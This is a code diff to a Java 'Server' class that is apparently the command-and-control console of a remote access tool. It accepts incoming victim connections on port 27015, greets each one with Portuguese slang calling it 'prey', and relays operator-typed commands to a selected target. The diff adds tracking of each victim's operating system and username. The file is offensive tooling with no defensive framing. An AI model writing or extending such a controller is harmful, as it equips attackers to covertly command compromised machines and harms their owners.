@@ -1,7 +1,9 @@
 package app;
 
-import static utils.ServerUtils.printCommandList;
-import static utils.ServerUtils.startOnNewThread;
+import network.ClientConnection;
+import network.Connection;
+import network.Message;
+import utils.ConsoleColors;
 
 import java.io.IOException;
 import java.net.ServerSocket;
@@ -9,17 +11,19 @@ import java.net.Socket;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Scanner;
-import network.ClientConnection;
-import network.Connection;
-import network.Message;
-import utils.ConsoleColors;
+
+import static utils.ServerUtils.printCommandList;
+import static utils.ServerUtils.startOnNewThread;
 
 public class Server {
 
     private static ServerSocket serverSocket;
     private final static Map<Integer, ClientConnection> targets = new HashMap<>();
+    private final static Map<ClientConnection, String> systemNames = new HashMap<>();
+    private final static Map<ClientConnection, String> userOS = new HashMap<>();
     private static int id = 0;
     private static ClientConnection actualTarget;
+    private static Scanner sc = new Scanner(System.in);
 
     public static void main(String[] args) throws IOException {
         serverSocket = new ServerSocket(27015);
@@ -29,7 +33,9 @@ public class Server {
     }
 
     public static void clientConnection() {
-        Scanner sc = new Scanner(System.in);
+        // resetta scanner
+        sc = new Scanner(System.in);
+
         Socket clientSocket = null;
         try {
             clientSocket = serverSocket.accept();
@@ -38,14 +44,13 @@ public class Server {
             e.printStackTrace();
         }
         System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress() + ":" + clientSocket.getPort());
-
         Connection targetConnection = new Connection(clientSocket);
 
         runHandlerThread(targetConnection);
 
         String command;
         do {
-            System.out.println(ConsoleColors.BLUE + "Target: " + formatIPandPORT(actualTarget) + ConsoleColors.RESET+"\n");
+            System.out.println(ConsoleColors.BLUE + userString(actualTarget) + ConsoleColors.RESET + "\n");
             command = sc.nextLine();
             if(!isNullOrEmpty(command)) {
                 switch(command) {
@@ -70,6 +75,8 @@ public class Server {
                     default:
                         if(targets.isEmpty()) {
                             System.out.println("Chefe, a lista ta vazia");
+                        } else if(command.isEmpty()) {
+                            System.out.println("Mestre, comando ta vazio");
                         } else {
                             actualTarget.getConnection().sendMessage(new Message(command));
                         }
@@ -81,12 +88,23 @@ public class Server {
     public static void removeFromTargets(ClientConnection c) {
         System.out.println("Opa vai kickar o " + formatIPandPORT(c));
         targets.remove(c);
+
+        // might or not be null
+        actualTarget = targets.get(0);
+    }
+
+    public static void addUserOS(ClientConnection c, String os) {
+        userOS.put(c, os);
+    }
+
+    public static void addUserSystemName(ClientConnection c, String user) {
+        systemNames.put(c, user);
     }
 
     private static void printTargets() {
         for(int i = 1; i <= targets.size(); i++) {
             ClientConnection target = targets.get(i);
-            System.out.println("(" + i + ") - " + formatIPandPORT(target));
+            System.out.println("(" + i + ") - " + userString(target));
         }
 
         System.out.println(ConsoleColors.GREEN + "-------------------------------------------------" + ConsoleColors.RESET);
@@ -107,5 +125,13 @@ public class Server {
 
     private static String formatIPandPORT(ClientConnection client) {
         return client.getConnection().getSocket().getInetAddress() + ":" + client.getConnection().getSocket().getPort();
+    }
+
+    private static String userString(ClientConnection c) {
+        String userOS = Server.userOS.get(c);
+        String userName = Server.systemNames.get(c);
+        String userIP = formatIPandPORT(c);
+
+        return userName + "@" + userIP + " [" + userOS + "]";
     }
 }
